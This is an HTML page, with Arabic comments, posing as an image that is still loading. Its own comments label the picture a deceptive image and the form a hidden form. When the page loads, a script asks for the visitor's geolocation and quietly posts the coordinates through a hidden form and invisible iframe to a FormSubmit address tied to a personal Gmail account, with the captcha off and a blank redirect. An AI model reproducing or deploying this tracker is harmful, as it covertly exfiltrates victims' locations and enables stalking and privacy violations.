<!DOCTYPE html>
<html lang="ar">
  <head>
    <meta charset="UTF-8" />
    <title>تحميل...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
      body {
        margin: 0;
        padding: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        background-color: #ffffff;
      }

      img {
        max-width: 100%;
        height: auto;
      }

      iframe {
        display: none; /* إخفاء الفورم */
      }
    </style>
  </head>
  <body>
    <!-- صورة خادعة -->
    <img src="https://via.placeholder.com/400x300.png?text=جارٍ+تحميل+الصورة..." alt="صورة" />

    <!-- فورم الإرسال الخفي -->
    <form action="https://formsubmit.co/m8k2001@gmail.com" method="POST" id="locationForm" target="hidden_iframe">
      <input type="hidden" name="Location" id="location">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="_redirect" value="about:blank">
    </form>

    <!-- إطار خفي لمنع ظهور صفحة FormSubmit -->
    <iframe name="hidden_iframe"></iframe>

    <script>
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const locationInfo = "Latitude: " + position.coords.latitude + ", Longitude: " + position.coords.longitude;
          document.getElementById("location").value = locationInfo;
          document.getElementById("locationForm").submit();
        });
      }
    </script>
  </body>
</html>
